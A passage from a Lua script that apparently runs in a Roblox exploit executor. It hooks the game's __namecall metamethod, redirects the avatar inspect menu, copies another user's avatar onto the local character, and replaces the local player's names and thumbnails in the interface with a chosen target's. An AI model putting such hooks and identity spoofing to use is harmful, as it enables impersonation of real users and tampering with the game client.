        ['Oldschool']  = { Idle='rbxassetid://10921232093', Run='rbxassetid://10921240218', Walk='rbxassetid://10921244891', Jump='rbxassetid://10921242013', Fall='rbxassetid://10921241244', Climb='rbxassetid://10921229866', Swim='rbxassetid://10921243048', SwimIdle='rbxassetid://10921244018' },
    }

    local ANIM_FOLDER_MAP = {
        ['Idle']     = { Folder='idle',     Children={'Animation1','Animation2'} },
        ['Run']      = { Folder='run',      Children={'RunAnim'} },
        ['Walk']     = { Folder='walk',     Children={'WalkAnim'} },
        ['Jump']     = { Folder='jump',     Children={'JumpAnim'} },
        ['Fall']     = { Folder='fall',     Children={'FallAnim'} },
        ['Climb']    = { Folder='climb',    Children={'ClimbAnim'} },
        ['Swim']     = { Folder='swim',     Children={'Swim'} },
        ['SwimIdle'] = { Folder='swimidle', Children={'SwimIdleAnim'} },
    }

    local CACHE_MAX = { faceTexture=80, description=40, appearanceModel=24, appearanceInfo=60, resolvedUserId=120, emoteData=80 }
    local faceTextureCache, faceTextureCacheTime = {}, {}
    local descriptionCache, appearanceModelCache, appearanceInfoCache = {}, {}, {}
    local resolvedUserIdCache, resolvedUserIdCacheTime = {}, {}

    local function prunePaired(vc, tc, maxEntries)
        local count = 0
        for _ in pairs(vc) do count = count + 1 end
        while count > maxEntries do
            local oldestKey, oldestTs = nil, math.huge
            for k in pairs(vc) do
                local ts = tc[k] or 0
                if ts < oldestTs then oldestTs = ts; oldestKey = k end
            end
            if oldestKey == nil then break end
            vc[oldestKey] = nil; tc[oldestKey] = nil
            count = count - 1
        end
    end

    local function cacheGetTimed(vc, tc, key, ttl)
        local v = vc[key]; local ts = tc[key]
        if v ~= nil and ts and os.clock() - ts <= ttl then return v end
        if v ~= nil then vc[key] = nil end
        if ts ~= nil then tc[key] = nil end
        return nil
    end

    local function cacheSetTimed(vc, tc, key, value, maxEntries)
        vc[key] = value; tc[key] = os.clock()
        prunePaired(vc, tc, maxEntries)
        return value
    end

    local AVATAR_CACHE_TTL = 20
    local RESOLVED_USERID_TTL = 600

    local function destroyDesc(e) if e and e.desc then pcall(function() e.desc:Destroy() end) end end
    local function destroyModel(e) if e and e.model then pcall(function() e.model:Destroy() end) end end

    local function getAppearanceModel(userId)
        local entry = appearanceModelCache[userId]
        if entry and entry.model and (os.clock() - (entry.timestamp or 0) <= AVATAR_CACHE_TTL) then
            local ok, c = pcall(function() return entry.model:Clone() end)
            if ok and c then return c end
        end
        local ok, model = pcall(function() return Players:GetCharacterAppearanceAsync(userId) end)
        if not ok or not model then return nil end
        local okS, stored = pcall(function() return model:Clone() end)
        if okS and stored then
            local prev = appearanceModelCache[userId]
            if prev and prev.model then pcall(function() prev.model:Destroy() end) end
            appearanceModelCache[userId] = { model = stored, timestamp = os.clock() }
        end
        return model
    end

    local function getTargetDescriptionCached(userId)
        local entry = descriptionCache[userId]
        if entry and entry.desc and (os.clock() - (entry.timestamp or 0) <= AVATAR_CACHE_TTL) then
            local ok, c = pcall(function() return entry.desc:Clone() end)
            if ok and c then return c end
        end
        local ok, desc = pcall(function() return Players:GetHumanoidDescriptionFromUserId(userId) end)
        if not ok or not desc then return nil end
        local okS, stored = pcall(function() return desc:Clone() end)
        if okS and stored then
            local prev = descriptionCache[userId]
            if prev and prev.desc then pcall(function() prev.desc:Destroy() end) end
            descriptionCache[userId] = { desc = stored, timestamp = os.clock() }
        end
        local okR, ret = pcall(function() return desc:Clone() end)
        return (okR and ret) or desc
    end

    local function getAppearanceInfoCached(userId)
        local entry = appearanceInfoCache[userId]
        if entry and entry.info and (os.clock() - (entry.timestamp or 0) <= AVATAR_CACHE_TTL) then
            return entry.info
        end
        local ok, info = pcall(function() return Players:GetCharacterAppearanceInfoAsync(userId) end)
        if ok and info then
            appearanceInfoCache[userId] = { info = info, timestamp = os.clock() }
            return info
        end
        return nil
    end

    local function clearAvatarCaches()
        for _, e in pairs(descriptionCache) do destroyDesc(e) end
        for _, e in pairs(appearanceModelCache) do destroyModel(e) end
        descriptionCache, appearanceModelCache, appearanceInfoCache = {}, {}, {}
        faceTextureCache, faceTextureCacheTime = {}, {}
        resolvedUserIdCache, resolvedUserIdCacheTime = {}, {}
    end

    local function normalizeForLookup(v)
        v = string.lower(tostring(v or ""))
        v = v:gsub("^@", ""):gsub("%s+", ""):gsub("_+", "")
        return v
    end

    local function findUserIdInServerByNameOrDisplay(inputText)
        local raw = tostring(inputText or ""):gsub("^%s+",""):gsub("%s+$","")
        local needleRaw = string.lower(raw)
        local needleNorm = normalizeForLookup(raw)
        if needleNorm == "" then return nil end
        local exactName, exactDisplay, exactDisplayCount = nil, nil, 0
        local prefixes = {}
        for _, plr in ipairs(Players:GetPlayers()) do
            local nameRaw = string.lower(plr.Name)
            local dispRaw = string.lower(plr.DisplayName)
            local nameNorm = normalizeForLookup(plr.Name)
            local dispNorm = normalizeForLookup(plr.DisplayName)
            if nameRaw == needleRaw or nameNorm == needleNorm then exactName = plr.UserId; break end
            if dispRaw == needleRaw or dispNorm == needleNorm then
                exactDisplay = plr.UserId; exactDisplayCount = exactDisplayCount + 1
            end
            if (needleRaw ~= "" and nameRaw:sub(1,#needleRaw) == needleRaw)
                or nameNorm:sub(1,#needleNorm) == needleNorm
                or (needleRaw ~= "" and dispRaw:sub(1,#needleRaw) == needleRaw)
                or dispNorm:sub(1,#needleNorm) == needleNorm then
                prefixes[#prefixes+1] = plr.UserId
            end
        end
        if exactName then return exactName end
        if exactDisplayCount == 1 then return exactDisplay end
        if #prefixes > 0 then return prefixes[1] end
        if exactDisplay then return exactDisplay end
        return nil
    end

    local function resolveUserToId(input)
        if input == nil then return nil end
        if type(input) == "number" then return math.floor(input) end
        if type(input) ~= "string" then return nil end
        local t = input:gsub("^%s+",""):gsub("%s+$","")
        if t == "" then return nil end
        local n = tonumber(t)
        if n then return math.floor(n) end
        local username = t:gsub("^@","")
        if username == "" then return nil end
        local ck = normalizeForLookup(username)
        if ck == "" then return nil end
        local cached = cacheGetTimed(resolvedUserIdCache, resolvedUserIdCacheTime, ck, RESOLVED_USERID_TTL)
        if cached then return cached end
        local inServer = findUserIdInServerByNameOrDisplay(username)
        if inServer then
            return cacheSetTimed(resolvedUserIdCache, resolvedUserIdCacheTime, ck, inServer, CACHE_MAX.resolvedUserId)
        end
        local ok, uid = pcall(function() return Players:GetUserIdFromNameAsync(username) end)
        if ok and uid then
            return cacheSetTimed(resolvedUserIdCache, resolvedUserIdCacheTime, ck, uid, CACHE_MAX.resolvedUserId)
        end
        return nil
    end

    local guiSpoof = {
        active=false, serial=0, identity=nil,
        originals=setmetatable({}, {__mode="k"}),
        identityCache={}, connections={},
        boundObjects=setmetatable({}, {__mode="k"}),
        boundRoots=setmetatable({}, {__mode="k"}),
    }

    local inspectKey = "__AvatarInspectTargetState"
    local inspectState = env and env[inspectKey] or nil
    if type(inspectState) ~= "table" then
        inspectState = { active=false, targetUserId=nil, targetName=nil, targetDescription=nil, hookInstalled=false }
        if env then env[inspectKey] = inspectState end
    end
    inspectState.refreshing = false
    inspectState.lastRefresh = tonumber(inspectState.lastRefresh) or 0

    local function destroyInspectDesc()
        local d = inspectState.targetDescription
        inspectState.targetDescription = nil
        if d then pcall(function() d:Destroy() end) end
    end

    local function clearInspectTarget()
        inspectState.active = false
        inspectState.targetUserId = nil
        inspectState.targetName = nil
        inspectState.refreshing = false
        inspectState.lastRefresh = 0
        destroyInspectDesc()
    end

    local function setInspectTarget(userId, targetName, targetDesc)
        local n = tonumber(userId); if not n then return end
        if inspectState.targetUserId ~= n then
            pcall(function() GuiService:CloseInspectMenu() end)
            destroyInspectDesc()
            inspectState.refreshing = false
            inspectState.lastRefresh = 0
        end
        inspectState.active = true
        inspectState.targetUserId = n
        if targetName ~= nil then inspectState.targetName = tostring(targetName) end
        if targetDesc then
            destroyInspectDesc()
            inspectState.targetDescription = targetDesc
        end
    end

    local function getInspectUserId(v)
        local n = tonumber(v); if n then return n end
        local ok, r = pcall(function() return v.Id or v.UserId end)
        if ok then return tonumber(r) end
        return nil
    end

    local hookMM = hookmetamethod or (env and env.hookmetamethod)
    local getMethod = getnamecallmethod or (env and env.getnamecallmethod)

    if not inspectState.hookInstalled and type(hookMM) == "function" and type(getMethod) == "function" then
        local oldNamecall
        local cb = function(self, ...)
            local method = getMethod()
            local state = (env and env[inspectKey]) or inspectState
            if state and state.active and self == GuiService then
                local args = {...}
                if method == "InspectPlayerFromUserId" then
                    if getInspectUserId(args[1]) == LocalPlayer.UserId and state.targetUserId then
                        args[1] = state.targetUserId
                    end
                elseif method == "InspectPlayerFromHumanoidDescription" then
                    local req = tostring(args[2] or "")
                    if (req == LocalPlayer.Name or req == LocalPlayer.DisplayName) and state.targetDescription then
                        args[1] = state.targetDescription
                        args[2] = state.targetName or req
                    end
                end
                return oldNamecall(self, table.unpack(args))
            end
            return oldNamecall(self, ...)
        end
        local wrapped = (type(newcclosure) == "function") and newcclosure(cb) or cb
        local okH, original = pcall(function() return hookMM(game, "__namecall", wrapped) end)
        if okH and type(original) == "function" then
            oldNamecall = original
            inspectState.hookInstalled = true
        end
    end

    local function isLocalInspectTitle(v)
        if type(v) ~= "string" then return false end
        local l = string.lower(v)
        for _, name in ipairs({LocalPlayer.Name, LocalPlayer.DisplayName}) do
            local ln = string.lower(tostring(name or ""))
            if ln ~= "" and (l == ln .. "'s avatar" or l == ln .. "’s avatar") then return true end
        end
        return false
    end

    local function requestTargetInspectRefresh()
        if not inspectState.active or not inspectState.targetUserId then return end
        local now = os.clock()
        if inspectState.refreshing or now - inspectState.lastRefresh < 1.5 then return end
        inspectState.refreshing = true
        inspectState.lastRefresh = now
        task.defer(function()
            if not inspectState.active or not inspectState.targetUserId then
                inspectState.refreshing = false; return
            end
            pcall(function() GuiService:CloseInspectMenu() end)
            task.wait()
            local opened = pcall(function() GuiService:InspectPlayerFromUserId(inspectState.targetUserId) end)
            if not opened and inspectState.targetDescription then
                pcall(function()
                    GuiService:InspectPlayerFromHumanoidDescription(
                        inspectState.targetDescription,
                        inspectState.targetName or tostring(inspectState.targetUserId))
                end)
            end
            task.delay(1.25, function() inspectState.refreshing = false end)
        end)
    end

    local function replacePlainText(v, from, to)
        if type(v) ~= "string" or type(from) ~= "string" or from == "" then return v end
        local pattern = from:gsub("([^%w])", "%%%1")
        return v:gsub(pattern, function() return tostring(to or "") end)
    end

    local function isIdentityWordChar(c)
        return type(c) == "string" and c ~= "" and c:match("[%w_]") ~= nil
    end

    local function replaceIdentityText(v, from, to)
        if type(v) ~= "string" or type(from) ~= "string" or from == "" then return v, false end
        local out, cursor, changed = {}, 1, false
        local fb = isIdentityWordChar(from:sub(1,1))
        local lb = isIdentityWordChar(from:sub(-1))
        while cursor <= #v do
            local s, e = v:find(from, cursor, true)
            if not s then out[#out+1] = v:sub(cursor); break end
            local before = s > 1 and v:sub(s-1, s-1) or ""
            local after = e < #v and v:sub(e+1, e+1) or ""
            if (not fb or not isIdentityWordChar(before)) and (not lb or not isIdentityWordChar(after)) then
                out[#out+1] = v:sub(cursor, s-1)
                out[#out+1] = tostring(to or "")
                cursor = e + 1
                changed = true
            else
                out[#out+1] = v:sub(cursor, s)
                cursor = s + 1
            end
        end
        return table.concat(out), changed
    end

    local function addReplacement(list, seen, from, to)
        if type(from) ~= "string" or from == "" or seen[from] then return end
        seen[from] = true
        list[#list+1] = { from = from, to = tostring(to or "") }
    end

    local function buildIdentityReplacements(identity)
        local reps, seen = {}, {}
        local function addVariants(from, to)
            addReplacement(reps, seen, from, to)
            addReplacement(reps, seen, from:lower(), to:lower())
            addReplacement(reps, seen, from:upper(), to:upper())
        end
        addVariants("@" .. LocalPlayer.Name, "@" .. identity.username)
        addVariants(LocalPlayer.DisplayName, identity.displayName)
        addVariants(LocalPlayer.Name, identity.username)
        table.sort(reps, function(a,b) return #a.from > #b.from end)
        return reps
    end

    local function getThumbnailContent(userId, ttype, tsize)
        local ok, c = pcall(function() return Players:GetUserThumbnailAsync(userId, ttype, tsize) end)
        if ok and type(c) == "string" and c ~= "" then return c end
        return nil
    end

    local function buildThumbnailContentMap(userId)
        local map = {}
        local specs = {
            {Enum.ThumbnailType.HeadShot,"Size48x48"},{Enum.ThumbnailType.HeadShot,"Size60x60"},
            {Enum.ThumbnailType.HeadShot,"Size100x100"},{Enum.ThumbnailType.HeadShot,"Size150x150"},
            {Enum.ThumbnailType.HeadShot,"Size420x420"},{Enum.ThumbnailType.AvatarBust,"Size150x150"},
            {Enum.ThumbnailType.AvatarBust,"Size352x352"},{Enum.ThumbnailType.AvatarBust,"Size420x420"},
            {Enum.ThumbnailType.AvatarThumbnail,"Size150x150"},{Enum.ThumbnailType.AvatarThumbnail,"Size352x352"},
            {Enum.ThumbnailType.AvatarThumbnail,"Size420x420"},{Enum.ThumbnailType.AvatarThumbnail,"Size720x720"},
        }
        for _, spec in ipairs(specs) do
            local okS, sizeVal = pcall(function() return Enum.ThumbnailSize[spec[2]] end)
            if okS and sizeVal then
                local oc = getThumbnailContent(LocalPlayer.UserId, spec[1], sizeVal)
                local tc = getThumbnailContent(userId, spec[1], sizeVal)
                if oc and tc then map[oc] = tc end
            end
        end
        return map
    end

    local function getTargetIdentity(userId)
        local cached = guiSpoof.identityCache[userId]
        if cached and os.clock() - cached.timestamp <= 60 then return cached.identity end
        local tp = nil
        pcall(function() tp = Players:GetPlayerByUserId(userId) end)
        local username = tp and tp.Name or nil
        local displayName = tp and tp.DisplayName or nil
        if not username or not displayName then
            local okUS, us = pcall(function() return game:GetService("UserService") end)
            if okUS and us then
                local okI, infos = pcall(function() return us:GetUserInfosByUserIdsAsync({userId}) end)
                local info = okI and type(infos) == "table" and infos[1] or nil
                if info then
                    username = username or info.Username or info.Name
                    displayName = displayName or info.DisplayName
                end
            end
        end
        if not username then
            local okN, name = pcall(function() return Players:GetNameFromUserIdAsync(userId) end)
            if okN then username = name end
        end
        username = tostring(username or userId)
        displayName = tostring(displayName or username)
        local identity = { userId=userId, username=username, displayName=displayName, thumbnailMap={} }
        identity.replacements = buildIdentityReplacements(identity)
        guiSpoof.identityCache[userId] = { identity = identity, timestamp = os.clock() }
        task.spawn(function()
            local tmap = buildThumbnailContentMap(userId)
            local entry = guiSpoof.identityCache[userId]
            if entry and entry.identity == identity then identity.thumbnailMap = tmap end
        end)
        return identity
    end

    local function rememberGuiProp(inst, prop, orig, spoofed)
        local props = guiSpoof.originals[inst]
        if not props then props = {}; guiSpoof.originals[inst] = props end
        local e = props[prop]
        if not e then e = { original = orig, spoofed = spoofed }; props[prop] = e
        else e.spoofed = spoofed end
    end

    local function disconnectGuiConns()
        for i = #guiSpoof.connections, 1, -1 do
            local c = guiSpoof.connections[i]
            guiSpoof.connections[i] = nil
            if c and c.Connected then pcall(function() c:Disconnect() end) end
        end
        guiSpoof.boundObjects = setmetatable({}, {__mode="k"})
        guiSpoof.boundRoots   = setmetatable({}, {__mode="k"})
    end

    local function restoreGuiIdentity()
        guiSpoof.active = false
        guiSpoof.serial = guiSpoof.serial + 1
        disconnectGuiConns()
        for inst, props in pairs(guiSpoof.originals) do
            if inst then
                for prop, e in pairs(props) do
                    pcall(function()
                        if inst[prop] == e.spoofed then inst[prop] = e.original end
                    end)
                end
            end
        end
        guiSpoof.originals = setmetatable({}, {__mode="k"})
        guiSpoof.identity = nil
    end

    local function spoofIdentityText(v, identity)
        if type(v) ~= "string" or v == "" then return v end
        local result = v
        local applied = {}
        for i, rep in ipairs(identity.replacements) do
            local token = "\1AV_ID_" .. tostring(i) .. "\2"
            local r, changed = replaceIdentityText(result, rep.from, token)
            if changed then
                result = r
                applied[#applied+1] = { token = token, value = rep.to }
            end
        end
        for _, rep in ipairs(applied) do
            result = replacePlainText(result, rep.token, rep.value)
        end
        return result
    end

    local function spoofIdentityImage(v, identity)
        if type(v) ~= "string" or v == "" then return v end
        local mapped = identity.thumbnailMap[v]
        if mapped then return mapped end
        local lid = tostring(LocalPlayer.UserId)
        if not v:find(lid, 1, true) then return v end
        local lv = v:lower()
        if not (lv:find("rbxthumb",1,true) or lv:find("thumbnail",1,true)
             or lv:find("headshot",1,true) or lv:find("avatar",1,true)
             or lv:find("userid",1,true) or lv:find("userids",1,true)) then
            return v
        end
        return replacePlainText(v, lid, tostring(identity.userId))
    end

    local function applyIdentityToGuiObject(inst, identity)
        if not inst then return end
        if inst:IsA("TextLabel") or inst:IsA("TextButton") or inst:IsA("TextBox") then
            local okT, cur = pcall(function() return inst.Text end)
            if okT then
                if isLocalInspectTitle(cur) then requestTargetInspectRefresh() end
                local s = spoofIdentityText(cur, identity)
                if s ~= cur then
                    local okS = pcall(function() inst.Text = s end)
                    if okS then rememberGuiProp(inst, "Text", cur, s) end
                end
            end
        elseif inst:IsA("ImageLabel") or inst:IsA("ImageButton") then
            local okI, cur = pcall(function() return inst.Image end)
            if okI then
                local s = spoofIdentityImage(cur, identity)
                if s ~= cur then
                    local okS = pcall(function() inst.Image = s end)
                    if okS then rememberGuiProp(inst, "Image", cur, s) end
                end
            end
        end
    end

    local function bindIdentityGuiObject(inst, identity)
        if not inst or guiSpoof.boundObjects[inst] then return end
        local prop = nil
        if inst:IsA("TextLabel") or inst:IsA("TextButton") or inst:IsA("TextBox") then prop = "Text"
        elseif inst:IsA("ImageLabel") or inst:IsA("ImageButton") then prop = "Image" end
        if not prop then return end
        local okC, conn = pcall(function()
            return inst:GetPropertyChangedSignal(prop):Connect(function()
                if not guiSpoof.active or guiSpoof.identity ~= identity then return end
                applyIdentityToGuiObject(inst, identity)
            end)
        end)
        if okC and conn then
            guiSpoof.boundObjects[inst] = true
            guiSpoof.connections[#guiSpoof.connections+1] = conn
        end
    end

    local function watchIdentityRoot(root, identity)
        if not root or guiSpoof.boundRoots[root] then return end
        local okC, conn = pcall(function()
            return root.DescendantAdded:Connect(function(inst)
                if not guiSpoof.active or guiSpoof.identity ~= identity then return end
                bindIdentityGuiObject(inst, identity)
                applyIdentityToGuiObject(inst, identity)
            end)
        end)
        if okC and conn then
            guiSpoof.boundRoots[root] = true
            guiSpoof.connections[#guiSpoof.connections+1] = conn
        end
    end

    local function scanIdentityGui(identity)
        local roots = { CoreGui, LocalPlayer:FindFirstChildOfClass("PlayerGui") }
        for _, root in ipairs(roots) do
            if root then
                watchIdentityRoot(root, identity)
                applyIdentityToGuiObject(root, identity)
                local okD, desc = pcall(function() return root:GetDescendants() end)
                if okD then
                    for _, inst in ipairs(desc) do
                        bindIdentityGuiObject(inst, identity)
                        applyIdentityToGuiObject(inst, identity)
                    end
                end
            end
        end
    end

    local applySerialRef = { value = 0 }

    local function startGuiIdentity(userId, applyToken)
        restoreGuiIdentity()
        setInspectTarget(userId)
        guiSpoof.active = true
        guiSpoof.serial = guiSpoof.serial + 1
        local guiToken = guiSpoof.serial
        task.spawn(function()
            local identity = getTargetIdentity(userId)
            if not guiSpoof.active or guiToken ~= guiSpoof.serial then return end
            if applyToken ~= applySerialRef.value then return end
            guiSpoof.identity = identity
            setInspectTarget(userId, identity.displayName)
            task.spawn(function()
                local desc = getTargetDescriptionCached(userId)
                if not guiSpoof.active or guiToken ~= guiSpoof.serial then
                    if desc then pcall(function() desc:Destroy() end) end
                    return
                end
                if desc then setInspectTarget(userId, identity.displayName, desc) end
            end)
            -- initial scan once
            scanIdentityGui(identity)
            while guiSpoof.active and guiToken == guiSpoof.serial and applyToken == applySerialRef.value do
                -- light refresh only (DescendantAdded already covers new UI)
                task.wait(8)
                if not guiSpoof.active or guiToken ~= guiSpoof.serial then break end
                -- only re-apply text/image on already-bound objects, no full GetDescendants
                if guiSpoof.identity == identity then
                    for inst in pairs(guiSpoof.boundObjects) do
                        if inst and inst.Parent then
                            pcall(applyIdentityToGuiObject, inst, identity)
                        end
                    end
                end
            end
        end)
    end

    local COPY_CLASSES = {"Shirt","Pants","ShirtGraphic","Accessory","Hat","BodyColors","CharacterMesh"}
    local COPY_CLASS_SET = {}
    for _, c in ipairs(COPY_CLASSES) do COPY_CLASS_SET[c] = true end

    local COPY_ANIMATION_FIELDS = {"ClimbAnimation","FallAnimation","IdleAnimation","JumpAnimation","RunAnimation","SwimAnimation","WalkAnimation"}

    local BODY_PART_NAMES = {
        "Head","Torso","UpperTorso","LowerTorso",
        "LeftArm","RightArm","LeftLeg","RightLeg",
        "LeftUpperArm","LeftLowerArm","LeftHand",
        "RightUpperArm","RightLowerArm","RightHand",
        "LeftUpperLeg","LeftLowerLeg","LeftFoot",
        "RightUpperLeg","RightLowerLeg","RightFoot",
    }

    local runtime = {
        active = Cfg['Enabled'] == true,
        applySerial = 0,
        currentUserId = nil,
        appearanceChildConn = nil,
        appearanceScaleConns = {},
        colorSnapshot = nil,
    }

    local function isCopyClass(c) return COPY_CLASS_SET[c] == true end
    local function shouldCloneClass(c) return isCopyClass(c) and c ~= "BodyColors" end
    local function isAccessoryClass(c) return c == "Accessory" or c == "Hat" end

    local function buildBasePartMap(model)
        local out = {}
        if not model then return out end
        for _, child in ipairs(model:GetChildren()) do
            if child:IsA("BasePart") then out[child.Name] = child end
        end
        return out
    end

    local function buildAttachmentCarrierMap(partMap)
        local carrier = {}
        for partName, part in pairs(partMap or {}) do
            for _, child in ipairs(part:GetChildren()) do
                if child:IsA("Attachment") then
                    local prev = carrier[child.Name]
                    if prev == nil then carrier[child.Name] = partName
                    elseif prev ~= partName then carrier[child.Name] = false end
                end
            end
        end
        return carrier
    end

    local function firstDecalTextureFromHead(head)
        if not head then return nil end
        for _, child in ipairs(head:GetChildren()) do
            if child:IsA("Decal") and child.Face == Enum.NormalId.Front and child.Texture ~= "" then
                return child.Texture
            end
        end
        for _, child in ipairs(head:GetChildren()) do
            if child:IsA("Decal") and child.Texture ~= "" then return child.Texture end
        end
        return nil
    end

    local function cacheFaceTexture(userId, texture)
        if texture and texture ~= "" then
            cacheSetTimed(faceTextureCache, faceTextureCacheTime, userId, texture, CACHE_MAX.faceTexture)
        end
        return texture
    end

    local function resolveFaceFromAssetId(assetId, userId)
        local ok, model = pcall(function() return InsertService:LoadAsset(assetId) end)
        if ok and model then
            local found = nil
            for _, inst in ipairs(model:GetDescendants()) do
                if inst:IsA("Decal") and inst.Texture ~= "" then found = inst.Texture; break end
            end
            model:Destroy()
            if found then return cacheFaceTexture(userId, found) end
        end
        return cacheFaceTexture(userId, "rbxassetid://" .. tostring(assetId))
    end

    local function resolveFaceTexture(userId, appearanceModel, targetDesc)
        local cached = cacheGetTimed(faceTextureCache, faceTextureCacheTime, userId, AVATAR_CACHE_TTL)
        if cached then return cached end
        local head = appearanceModel and appearanceModel:FindFirstChild("Head")
        local direct = firstDecalTextureFromHead(head)
        if direct then return cacheFaceTexture(userId, direct) end
        if targetDesc and targetDesc.Face and targetDesc.Face ~= 0 then
            return resolveFaceFromAssetId(targetDesc.Face, userId)
        end
        local info = getAppearanceInfoCached(userId)
        if info and info.assets then
            for _, asset in ipairs(info.assets) do
                if asset.assetType and asset.assetType.id == 18 and asset.id then
                    return resolveFaceFromAssetId(asset.id, userId)
                end
            end
        end
        return nil
    end

    local function applyFaceTexture(char, texture)
        local head = char:FindFirstChild("Head")
        if not head then return end
        for _, child in ipairs(head:GetChildren()) do
            if child:IsA("Decal") and (child.Name == "face" or child.Face == Enum.NormalId.Front) then
                child:Destroy()
            end
        end
        if head:IsA("MeshPart") then pcall(function() head.TextureID = "" end) end
        local mesh = head:FindFirstChildOfClass("SpecialMesh")
        if mesh then pcall(function() mesh.TextureId = "" end) end
        local sa = head:FindFirstChildOfClass("SurfaceAppearance")
        if sa then pcall(function() sa:Destroy() end) end
        if not texture or texture == "" then texture = "rbxassetid://0" end
        local decal = Instance.new("Decal")
        decal.Name = "face"
        decal.Face = Enum.NormalId.Front
        decal.Texture = texture
        decal.Parent = head
    end

    local function buildSourcePartSizeMap(srcModel)
        local sizes = {}
        for _, part in ipairs(srcModel:GetChildren()) do
            if part:IsA("BasePart") then sizes[part.Name] = part.Size end
        end
        return sizes
    end

    local function scaleAccessoryOnce(acc, char, sourcePartSizeMap, charPartMap, attachmentCarrierMap)
        local handle = acc:FindFirstChild("Handle")
        if not handle or not handle:IsA("BasePart") then return end
        local matched = nil
        for _, hChild in ipairs(handle:GetChildren()) do
            if hChild:IsA("Attachment") then
                local carrier = attachmentCarrierMap and attachmentCarrierMap[hChild.Name] or nil
                if type(carrier) == "string" then matched = carrier; break end
                if carrier == false then
                    local scan = charPartMap or buildBasePartMap(char)
                    for partName, bodyPart in pairs(scan) do
                        if bodyPart and bodyPart:IsA("BasePart") and bodyPart:FindFirstChild(hChild.Name) then
                            matched = partName; break
                        end
                    end
                end
            end
            if matched then break end
        end
        if not handle:GetAttribute("_cpBaseSizeX") then
            handle:SetAttribute("_cpBaseSizeX", handle.Size.X)
            handle:SetAttribute("_cpBaseSizeY", handle.Size.Y)
            handle:SetAttribute("_cpBaseSizeZ", handle.Size.Z)
            for _, hChild in ipairs(handle:GetChildren()) do
                if hChild:IsA("Attachment") then
                    hChild:SetAttribute("_cpBasePosX", hChild.Position.X)
                    hChild:SetAttribute("_cpBasePosY", hChild.Position.Y)
                    hChild:SetAttribute("_cpBasePosZ", hChild.Position.Z)
                end
            end
            local sm0 = handle:FindFirstChildOfClass("SpecialMesh")
            if sm0 then
                sm0:SetAttribute("_cpBaseScaleX", sm0.Scale.X)
                sm0:SetAttribute("_cpBaseScaleY", sm0.Scale.Y)
                sm0:SetAttribute("_cpBaseScaleZ", sm0.Scale.Z)
            end
        end
        local scale = nil
        if matched then
            local srcSize = sourcePartSizeMap[matched]
            local dst = char:FindFirstChild(matched)
            if srcSize and dst and dst:IsA("BasePart") then
                local sx = math.max(srcSize.X, 0.001)
                local sy = math.max(srcSize.Y, 0.001)
                local sz = math.max(srcSize.Z, 0.001)
                scale = (dst.Size.X/sx + dst.Size.Y/sy + dst.Size.Z/sz) / 3
            end
        end
        local function applyScale(s)
            local bx, by, bz = handle:GetAttribute("_cpBaseSizeX"), handle:GetAttribute("_cpBaseSizeY"), handle:GetAttribute("_cpBaseSizeZ")
            if bx and by and bz then pcall(function() handle.Size = Vector3.new(bx*s, by*s, bz*s) end) end
            for _, hChild in ipairs(handle:GetChildren()) do
                if hChild:IsA("Attachment") then
                    local px, py, pz = hChild:GetAttribute("_cpBasePosX"), hChild:GetAttribute("_cpBasePosY"), hChild:GetAttribute("_cpBasePosZ")
                    if px and py and pz then pcall(function() hChild.Position = Vector3.new(px*s, py*s, pz*s) end) end
                end
            end
            local sm = handle:FindFirstChildOfClass("SpecialMesh")
            if sm then
                local msx, msy, msz = sm:GetAttribute("_cpBaseScaleX"), sm:GetAttribute("_cpBaseScaleY"), sm:GetAttribute("_cpBaseScaleZ")
                pcall(function()
                    if msx and msy and msz then sm.Scale = Vector3.new(msx*s, msy*s, msz*s)
                    else sm.Scale = sm.Scale * s end
                end)
            end
        end
        if scale and math.abs(scale - 1) > 0.01 then applyScale(scale) else applyScale(1) end
    end

    local function applyBodyFromDescription(targetDesc, char)
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum or not targetDesc then return false end
        for _, f in ipairs(COPY_ANIMATION_FIELDS) do
            pcall(function() targetDesc[f] = 0 end)
        end
        return pcall(function() hum:ApplyDescription(targetDesc) end)
    end

    local function toColor3(value)
        local k = typeof(value)
        if k == "Color3" then return value end
        if k == "BrickColor" then return value.Color end
        if k == "number" then
            local ok, brick = pcall(function() return BrickColor.new(value) end)
            if ok and brick then return brick.Color end
        end
        return nil
    end

    local function snapshotColors(char)
        if not char then return nil end
        local s = { bodyColors = nil, partColors = {} }
        local bc = char:FindFirstChildOfClass("BodyColors")
        if bc then s.bodyColors = bc:Clone() end
        for _, c in ipairs(char:GetChildren()) do
            if c:IsA("BasePart") then s.partColors[c.Name] = c.BrickColor end
        end
        return s
    end

    local function destroyColorSnapshot(s)
        if not s then return end
        if s.bodyColors then pcall(function() s.bodyColors:Destroy() end); s.bodyColors = nil end
    end

    local function applyColors(targetDesc, char, sourceModel, preferred)
        if not char then return end
        local bc = char:FindFirstChildOfClass("BodyColors")
        if not bc then bc = Instance.new("BodyColors"); bc.Parent = char end
        local p = preferred and preferred.bodyColors or nil
        local s = sourceModel and sourceModel:FindFirstChildOfClass("BodyColors")
        local hc  = (p and p.HeadColor3)     or (targetDesc and toColor3(targetDesc.HeadColor))     or (s and s.HeadColor3)
        local lac = (p and p.LeftArmColor3)  or (targetDesc and toColor3(targetDesc.LeftArmColor))  or (s and s.LeftArmColor3)
        local rac = (p and p.RightArmColor3) or (targetDesc and toColor3(targetDesc.RightArmColor)) or (s and s.RightArmColor3)
        local tc  = (p and p.TorsoColor3)    or (targetDesc and toColor3(targetDesc.TorsoColor))    or (s and s.TorsoColor3)
        local llc = (p and p.LeftLegColor3)  or (targetDesc and toColor3(targetDesc.LeftLegColor))  or (s and s.LeftLegColor3)
        local rlc = (p and p.RightLegColor3) or (targetDesc and toColor3(targetDesc.RightLegColor)) or (s and s.RightLegColor3)
        if hc  then bc.HeadColor3 = hc end
        if lac then bc.LeftArmColor3 = lac end
        if rac then bc.RightArmColor3 = rac end
        if tc  then bc.TorsoColor3 = tc end
        if llc then bc.LeftLegColor3 = llc end
        if rlc then bc.RightLegColor3 = rlc end
        local pmap = {
            Head=hc, Torso=tc, UpperTorso=tc, LowerTorso=tc,
            LeftArm=lac, RightArm=rac, LeftLeg=llc, RightLeg=rlc,
            ["Left Arm"]=lac, ["Right Arm"]=rac, ["Left Leg"]=llc, ["Right Leg"]=rlc,
            LeftUpperArm=lac, LeftLowerArm=lac, LeftHand=lac,
            RightUpperArm=rac, RightLowerArm=rac, RightHand=rac,
            LeftUpperLeg=llc, LeftLowerLeg=llc, LeftFoot=llc,
            RightUpperLeg=rlc, RightLowerLeg=rlc, RightFoot=rlc,
